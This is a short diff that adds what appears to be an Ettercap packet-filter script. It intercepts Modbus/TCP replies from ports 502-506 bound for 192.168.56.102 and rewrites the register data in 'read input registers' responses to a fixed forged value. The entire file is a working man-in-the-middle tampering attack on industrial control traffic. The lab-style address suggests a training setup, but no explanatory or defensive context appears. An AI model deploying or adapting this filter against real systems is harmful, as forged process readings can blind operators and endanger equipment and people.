@@ -1,0 +1,7 @@
+if (ip.dst == '192.168.56.102') {
+    if (tcp.src == 502 || tcp.src == 503 || tcp.src == 504 || tcp.src == 505 || tcp.src == 506) {
+        if (DATA.data + 7 == "\x04") {
+            DATA.data + 9 = "\x00\x00\x00\x00\x00\x00\x05\x39";
+        }
+    }
+}
